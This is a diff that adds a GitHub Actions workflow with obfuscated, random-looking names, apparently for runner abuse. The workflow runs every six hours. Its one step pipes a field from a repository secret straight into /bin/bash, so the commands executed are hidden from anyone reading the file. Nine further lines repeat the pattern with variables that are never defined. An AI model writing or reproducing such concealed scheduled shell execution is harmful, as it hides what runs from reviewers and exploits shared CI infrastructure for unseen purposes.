@@ -1,0 +1,25 @@
+name: toucanprimary
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: toucanprimary
+        env:
+          ahap0: ${{ secrets.ahap0 }}
+        run: |
+          echo $ahap0 | jq -r .p237 | /bin/bash
+          echo $bg8915 | jq -r .joqo7544 | /bin/bash
+          echo $y1 | jq -r .oos9442 | /bin/bash
+          echo $icotk16 | jq -r .vhsft02 | /bin/bash
+          echo $m53714 | jq -r .bsi75086 | /bin/bash
+          echo $tcxt1113 | jq -r .u2 | /bin/bash
+          echo $ycbar181 | jq -r .djwd00 | /bin/bash
+          echo $vs956 | jq -r .d7 | /bin/bash
+          echo $bekm992 | jq -r .nqkd1 | /bin/bash
+          echo $ba9 | jq -r .dzhxq00 | /bin/bash
+
